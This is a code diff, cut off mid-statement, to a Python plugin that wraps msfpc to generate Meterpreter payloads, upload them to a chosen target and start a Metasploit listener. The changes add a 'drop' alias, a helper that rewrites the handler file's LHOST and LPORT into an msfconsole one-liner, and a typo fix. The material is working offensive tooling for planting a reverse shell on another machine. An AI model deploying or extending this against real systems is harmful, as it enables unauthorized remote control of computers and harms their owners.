@@ -9,7 +9,7 @@ ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
 MSFPC_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mpc", "msfpc.sh")
 
 def get_cmds():
-    return ['msfpc', 'drop_meterpreter', 'catch_rc']
+    return ['msfpc', 'drop', 'drop_meterpreter', 'catch_rc']
 
 #cmd_str = Raw user input
 # args = everything but the msfpc part (best effort)
@@ -67,6 +67,21 @@ def _msfpc(cmd_str, arg_str=""):
 
     return ansi_escape.sub('', payload), handler    
 
+def _patch_handler(handler):
+    with open(handler, "r") as f:
+        lines = f.readlines()
+        for i,l in enumerate(lines):
+            if l.startswith("set LHOST"):
+                lines[i] = "set LHOST {LHOST}"
+            elif l.startswith("set LPORT"):
+                lines[i] = "set LPORT {REAL_PORT}"
+            elif l.startswith("#"):
+                lines[i] = ""
+        cmd = "; ".join([x.strip() for x in lines if x])
+        print(cmd)
+            
+    return "msfconsole -qx {};".format(shlex.quote(cmd))
+
 def msfpc(cmd_str, arg_str=""):
     _msfpc(cmd_str, arg_str)
 
@@ -76,15 +91,18 @@ def _rename(path, name):
     os.rename(path, new_path)
     return new_path
 
+def drop(cmd_str, arg_str=""):
+    return drop_meterpreter(cmd_str, arg_str)
+
 def drop_meterpreter(cmd_str, arg_str=""):
     target = plugin._get_target()
     if not target:
         print("Set target first!")
-
+        return
     outname = None
     outarg = "-o"
     if outarg in arg_str:
-        arr = shlex.sploit(arg_str)
+        arr = shlex.split(arg_str)
         i = arr.index(outarg)
         if len(arr) > i + 1:
             outname = arr[i+1]
@@ -96,7 +114,8 @@ def drop_meterpreter(cmd_str, arg_str=""):
     if outname:
        payload = _rename(payload, outname)
        handler = _rename(handler, "{}.rc".format(outname.rsplit(".", 1)[0]) )
-    handler_cmd = "msfconsole -qr {};".format(handler)
+    #handler_cmd = "msfconsole -qr {};".format(handler)
+    handler_cmd = _patch_handler(handler)
     cmds = []
     cmds.append("upload {}".format(payload))
     cmds.append(
